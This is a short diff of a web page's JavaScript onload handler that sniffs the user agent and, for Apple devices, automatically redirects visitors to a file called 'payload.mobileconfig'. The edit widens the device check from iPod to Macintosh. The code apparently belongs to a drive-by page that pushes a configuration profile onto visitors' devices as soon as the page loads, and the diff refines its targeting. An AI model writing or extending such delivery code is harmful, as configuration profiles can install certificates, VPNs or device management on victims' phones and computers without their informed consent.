@@ -12,7 +12,7 @@ window.onload = function() {
     console.log("[DEBUG] User Agent: " + userAgent); // Logging
 
     // iDevice Check
-    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+    if (/iPad|iPhone|Macintosh/.test(userAgent) && !window.MSStream) {
         window.location.href = "payload.mobileconfig";
         
         setTimeout(function() {
